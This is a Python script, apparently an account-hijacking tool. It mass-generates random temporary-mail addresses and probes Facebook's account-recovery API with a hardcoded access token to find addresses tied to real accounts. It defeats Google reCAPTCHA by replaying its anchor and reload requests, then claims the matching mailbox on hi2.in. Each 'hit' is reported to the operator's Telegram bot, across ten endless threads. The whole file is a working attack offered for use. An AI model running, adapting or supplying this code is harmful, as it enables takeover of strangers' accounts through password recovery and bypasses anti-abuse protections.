import requests
import re
import base64
import time
import os
import threading
import random
import sys

os.system('cls' if os.name == 'nt' else 'clear')

token = input('enter token : ')
ID = int(input('enter id : '))

hit = 0
bi = 0
be = 0

photo_url = ""

try:
    import httpx
    import user_agent
except:
    os.system("pip install httpx httpx[http2] user_agent")
    import httpx
    import user_agent

def check_email(email):
    global bi, hit, be
    siteKey = '6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct'
    siteUrl = 'https://hi2.in/'
    userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36'

    start_time = time.time()

    site_html = requests.get(siteUrl).text

    try:
        renderUrl = re.findall(
            r"""'"['"]""",
            site_html
        )[0]
    except:
        renderUrl = 'https://www.google.com/recaptcha/api2/recaptcha__en.js'

    js = requests.get(renderUrl).text

    match = re.search(r"po.src\s*=\s*'(https://[^']+)';", js)

    if match:
        v = match.group(1).split('/')[5]
        api = renderUrl.split('.js')[0]
        if 'api2' not in api and 'enterprise' not in api:
            api += '2'
    else:
        v = renderUrl.split('/')[5]
        api = 'https://www.google.com/recaptcha/api2'

    site = requests.get('https://www.google.com')
    cookies = site.cookies

    headers = {
        "accept": "/",
        "accept-language": "en-US,en;q=0.9",
        "origin": "https://www.google.com",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": userAgent
    }

    domain = siteUrl.split('/')[2]
    co = base64.b64encode((f'https://{domain}:443').encode()).decode().replace('=', '.')

    anchor_params = {
        'ar': '1',
        'k': siteKey,
        'co': co,
        'hl': 'en',
        'v': v,
        'size': 'invisible',
        'cb': 'abc123'
    }

    headers['referer'] = siteUrl

    anchor = requests.get(
        f'{api}/anchor',
        params=anchor_params,
        headers=headers,
        cookies=cookies
    ).text

    recaptcha_token = anchor.split('recaptcha-token" value="')[1].split('"')[0]

    reload_headers = headers.copy()
    reload_headers.pop('content-type', None)

    reload_data = {
        'v': v,
        'co': co,
        'reason': 'q',
        'size': 'invisible',
        'hl': 'en',
        'k': siteKey,
        'c': recaptcha_token,
        'chr': '',
        'vh': '',
        'bg': ''
    }

    reload = requests.post(
        f'{api}/reload?k={siteKey}',
        data=reload_data,
        headers=reload_headers,
        cookies=cookies
    ).text

    final_token = reload.split('"rresp","')[1].split('"')[0]

    prefix, domin = email.split('@')

    headers2 = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://hi2.in',
        'referer': 'https://hi2.in/',
        'user-agent': userAgent
    }

    data = {
        'domain': domin,
        'prefix': prefix,
        'recaptcha': final_token
    }

    response = requests.post(
        'https://hi2.in/api/custom',
        headers=headers2,
        data=data
    )
    print(response.text)
   
    if "Just a moment..." in response.text:
        print("❌ Error: Cloudflare block turn on vpn or change city ! ")
    elif "hash" in response.text:
        hit += 1
        dd = f'''┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃               MythEmre                   ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫

Hit      : {hit}
Kötü       : {be}
Hepsi   : {hit + be + bi}

Mail = {email}

┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
        '''
        if photo_url:
            requests.post(
                f"https://api.telegram.org/bot{token}/sendPhoto",
                data={
                    "chat_id": ID,
                    "photo": photo_url,
                    "caption": dd
                }
            )
        else:
            requests.post(
                f"https://api.telegram.org/bot{token}/sendMessage",
                data={
                    "chat_id": ID,
                    "text": dd
                }
            )
    elif "address already taken" in response.text:
        be += 1
    else:
        print(email, response.text)

def check_ig(email):
    global bi, hit, be
    try:
        url = 'https://b-graph.facebook.com/recover_accounts'

        headers = {
            'Host': 'b-graph.facebook.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
        }

        data = f"q={email}&friend_name=&qs=&summary=true&device_id=d15ef240-9126-44ab-9574-049eb0802d8c&src=fb4a_account_recovery&machine_id=&sfdid=a6ca2f76-0995-4db7-9083-667fc42d836d&fdid=d15ef240-9126-44ab-9574-049eb0802d8c&sim_serials=%5B%5D&sms_retriever=false&cds_experiment_group=-1&oe_aa_experiment_group=-1&oe_aa_experiment_group_immediate_exposure=-1&shared_phone_test_group=&allowlist_email_exp_name=&shared_phone_exp_name=&shared_phone_cp_nonce_code=&shared_phone_number=&is_auto_search=false&is_feo2_api_level_enabled=false&is_sso_like_oauth_search=false&encrypted_msisdn=&locale=en_US&client_country_code=IQ&method=GET&fb_api_req_friendly_name=accountRecoverySearch&fb_api_caller_class=AccountSearchHelper&access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"

        resp = requests.post(url, headers=headers, data=data)
    
        if "network_info" in resp.text:
            check_email(email)
        else:
            bi += 1
    except requests.exceptions.RequestException as e:
        print(f"❌ خطأ في الاتصال: {e}")
    
    print(f'''
\033[97m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\033[0m
\033[97m┃               SYSTEM PANEL                   ┃\033[0m
\033[97m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\033[0m

\033[92mHit      : {hit}\033[0m
\033[91mKötü       : {be}\033[0m
\033[93mDenenilen  : {bi}\033[0m
\033[96mHepsi   : {hit + be + bi}\033[0m

\033[97m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\033[0m
''')

def qq():
    ema = random.choice(['hi2.in', 'telegmail.com'])
    letters = "abcdefghijklmnopqrstuvwxyz"
    email = "".join(random.choice(letters) for _ in range(5)) + '@' + ema
    check_ig(email)

def worker():
    while True:
        qq()

threads_count = 10
for _ in range(threads_count):
    t = threading.Thread(target=worker)
    t.start()
